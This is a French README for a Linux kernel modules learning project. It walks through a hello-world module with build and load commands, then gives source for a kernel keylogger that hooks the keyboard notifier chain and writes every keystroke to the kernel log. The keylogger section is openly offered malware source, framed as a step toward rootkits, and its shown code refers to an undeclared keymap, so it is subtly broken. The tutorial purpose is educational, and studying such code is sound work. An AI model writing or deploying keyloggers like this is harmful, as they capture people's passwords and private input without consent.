
# Linux-Modules

Ce projet a pour objectif d'explorer le fonctionnement des modules sous Linux. Il propose un programme simple qui affiche un message dans les logs lors du chargement et du déchargement du module.

---

## 📋 Pré-requis

Certaines dépendances doivent être satisfaites pour garantir le bon fonctionnement de ce projet.

### Pour Debian :
```bash
sudo apt install build-essential
sudo apt install linux-headers-$(uname -r)
```

### Pour Arch :
```bash
sudo pacman -S --needed base-devel
sudo pacman -S linux$(uname -r | cut -d '.' -f 1,2 | tr -d .)-headers
```

### Vérification :

Assurez-vous qu'en exécutant la commande suivante :

```bash
ls /lib/modules/$(uname -r)
```

Vous voyez un lien symbolique nommé **`build`** et **`source`**.

---

## 🚀 Hello World !

Voici le programme utilisé pour illustrer le fonctionnement d'un module Linux :

```c
#include <linux/kernel.h>  // Définitions pour les fonctions liées au noyau.
#include <linux/init.h>    // Macros et définitions pour l'initialisation et la sortie des modules.
#include <linux/module.h>  // Structures et macros pour la gestion des modules du noyau.

MODULE_DESCRIPTION("Hello World du Kernel");  // Description du module.
MODULE_AUTHOR("Aiden");                       // Auteur du module.
MODULE_LICENSE("GPL");                        // Licence (GPL : GNU General Public License).

// Fonction appelée lors du chargement du module dans le noyau.
static int __init Message_init(void) {
        printk(KERN_INFO "Hello world!\n");
        return 0;
}

// Fonction appelée lors du déchargement du module du noyau.
static void __exit Message_exit(void) {
        printk(KERN_INFO "Goodbye world\n");
}

module_init(Message_init);  // Spécifie la fonction d'entrée du module.
module_exit(Message_exit);  // Spécifie la fonction de sortie du module.
```
> Ici, l'utilisation de `__init` et `__exit` permet de marquer ces fonctions comme utilisables uniquement pendant l'initialisation du module.
>
> Une fois l'initialisation terminée et si le module est chargé de manière statique, le code associé est libéré de la mémoire pour réduire l'empreinte mémoire du noyau.

---

## 🛠️ Compilation du module

Pour compiler ce module, exécutez :

```bash
$ obj-m=SimpleKernelModule.o
$ make -C /lib/modules/$(uname -r)/build M=$(pwd)
```

> Ce processus peut être simplifié en utilisant le [`Makefile`](https://github.com/IAidenI/Linux-Modules/tree/main/bin/HelloWorld/Makefile) fourni dans le dépôt.

### Vérification de la compilation :

```bash
$ modinfo bin/SimpleKernelModule.ko
filename:       /home/aiden/Documents/C-C++/Rootkits/Linux-Modules/bin/SimpleKernelModule.ko
license:        GPL
author:         Aiden
description:    Hello World du Kernel
depends:        
retpoline:      Y
name:           SimpleKernelModule
vermagic:       6.1.0-26-amd64 SMP preempt mod_unload modversions
```

---

## 📦 Chargement et déchargement du module

### Chargement dans le noyau :
```bash
$ sudo insmod bin/SimpleKernelModule.ko
$ sudo dmesg | tail -1
[ 4723.035728] Hello world!
```

### Déchargement du module :
```bash
$ sudo rmmod bin/SimpleKernelModule.ko
$ sudo dmesg | tail -1
[ 4759.100773] Goodbye world
```

---

## 🔑 Keylogger

Maintenant que la base est comprise, voici un projet un peu plus avancé : un **keylogger**.

### Fonctionnement du clavier :
1. **Appui sur une touche** → Le matériel (clavier) génère un signal électrique.  
2. **Pilote matériel** → Traduit ce signal en un événement (scan code).  
3. **Framework d'entrée Linux** → Transforme ce scan code en code de touche (keycode).  
4. **Système de fichiers /dev/input/eventX** → Rend cet événement disponible pour les applications.  
5. **Application utilisateur** → Interprète l'événement et réagit en conséquence.

Le keylogger s'insère entre l'étape 3 et 4, observant chaque événement avant qu'il ne soit transmis aux applications.  
Il peut :
- Enregistrer les frappes.  
- Modifier ou bloquer certaines touches.

### Exemple de code :

```c
#include <linux/kernel.h>             // Inclus les définitions pour les fonctions liées au noyau.
#include <linux/init.h>               // Inclus les macros et définitions pour l'initialisation et la sortie des modules.
#include <linux/module.h>             // Inclus les structures et macros pour la gestion des modules du noyau.
#include <linux/notifier.h>           // Inclus la gestion des interruptions
#include <linux/keyboard.h>           // Inclus la gestion des touches presser
#include <linux/input-event-codes.h>  // Inclus la correspondance entre un code et la touche pressé

MODULE_DESCRIPTION("Basique Keylogger");  // Description du module.
MODULE_AUTHOR("Aiden");                   // Auteur du module.
MODULE_LICENSE("GPL");                    // Licence du module (GPL : GNU General Public License).

static const char *keymapUS[] = {
    [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c",
    [KEY_D] = "d", [KEY_E] = "e", [KEY_F] = "f",
    [KEY_G] = "g", [KEY_H] = "h", [KEY_I] = "i",
    [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
    [KEY_M] = "m", [KEY_N] = "n", [KEY_O] = "o",
    [KEY_P] = "p", [KEY_Q] = "q", [KEY_R] = "r",
    [KEY_S] = "s", [KEY_T] = "t", [KEY_U] = "u",
    [KEY_V] = "v", [KEY_W] = "w", [KEY_X] = "x",
    [KEY_Y] = "y", [KEY_Z] = "z",
};


/* MISE EN PLACE D'UN NOTIFIER BLOCK */
/*
    Un notifier block est une structure avec :

    - Une priorité (ordre d’exécution si plusieurs hooks sont enregistrés).
    - Un callback qui est appelé lorsqu’un événement est capturé.
*/
// Déclaration de la fonction de callback
// /!\ Doit obligatoirement être fait avant la création du struct
static int UserKeyboard_callback(struct notifier_block *self, unsigned long pressed, void* data) {
        // Interprétation des données reçues par le clavier

	/*
	    Actuellement, data est un pointeur vers n'importe quelle type de données.
	    Donc le compilateur ne sais pas ce que contient data, il faut donc lui spécifier le type.
	    Et c'est à cela que sert param
	*/
	struct keyboard_notifier_param* param = data;

	/*
	    Et voici la structure d'un keyboard_notifier_param :
	    struct keyboard_notifier_param {
	        struct vc_data *vc;	// VC on which the keyboard press was done
	        int down;		// Pressure of the key?
	        int shift;		// Current shift mask
	        int ledstate;		// Current led state
	        unsigned int value;	// keycode, unicode value or keysym
	    };
	      source : https://github.com/torvalds/linux/blob/master/include/linux/keyboard.h
	    Dans notre cas tout n'est pas interessant, on va juste s'occuper de down et value
	    Down permet de savoir si la touche est enfoncé (1) ou relaché (0) et value quel touche à été pressé
	*/

	/*
	    Il y a également la variable pressed qui est interessante. Voici des constantes qui sont liée à elle :
	     * Console keyboard events.
 	     * Note: KBD_KEYCODE is always sent before KBD_UNBOUND_KEYCODE, KBD_UNICODE and
 	     * KBD_KEYSYM.
	    #define KBD_KEYCODE		0x0001 // Keyboard keycode, called before any other
	    #define KBD_UNBOUND_KEYCODE	0x0002 // Keyboard keycode which is not bound to any other
	    #define KBD_UNICODE		0x0003 // Keyboard unicode
	    #define KBD_KEYSYM		0x0004 // Keyboard keysym
	    #define KBD_POST_KEYSYM	0x0005 // Called after keyboard keysym interpretation
	      source : https://github.com/torvalds/linux/blob/master/include/linux/notifier.h
	    Ici je vais m'interesser surtout à KBD_KEYCODE pour avoir les valeurs brute et donc pouvoir aussi interpreter les shift, alt etc..
	    Mais KBD_KEYSYM peut être également utilie pour avoir déjà une interprétation des caractères pressé
	    mais se limitera au lettres, chiffres et caractères spéciaux
	*/

	if (pressed == KBD_KEYCODE && param->down) {
		int keycode = param->value; // On récupère la touche pressé
		if (keycode <= KEY_MAX && keymapFR[keycode]) {
			printk(KERN_INFO "Keylog : %s\n", keymapFR[keycode]);
		} else {
			printk(KERN_INFO "Keylog : [UNKNOW - %d]\n", keycode);
		}
	}
        return NOTIFY_OK;
}

static struct notifier_block UserKeyboard = {
	.notifier_call = UserKeyboard_callback, // Le callback
	.priority = 0,				// La priorité
};



/* MISE EN PLACE DU CHARGEMENT/DECHARGEMENT DU MODULE */

// Fonction appelée lors du chargement du module dans le noyau.
static int __init Keylogger_init(void) {
	printk(KERN_INFO "[+] Keylogger chargé avec succès.\n");
	register_keyboard_notifier(&UserKeyboard); // Ecoute les frappes du clavier
	return 0;
}

// Fonction appelée lors du déchargement du module du noyau.
static void __exit Keylogger_exit(void) {
	printk(KERN_INFO "[-] Keylogger déchargé avec succès.\n");
	unregister_keyboard_notifier(&UserKeyboard); // Désactive le hook
}

module_init(Keylogger_init);  // Spécifie la fonction d'entrée du module.
module_exit(Keylogger_exit);  // Spécifie la fonction de sortie du module.
```
> Pour des soucis de clarté, les keymaps sont grandement réduit mais disponible dans leurs totalité [`ici`](https://github.com/IAidenI/Linux-Modules/tree/main/bin/Keylogger/keylogger.c).
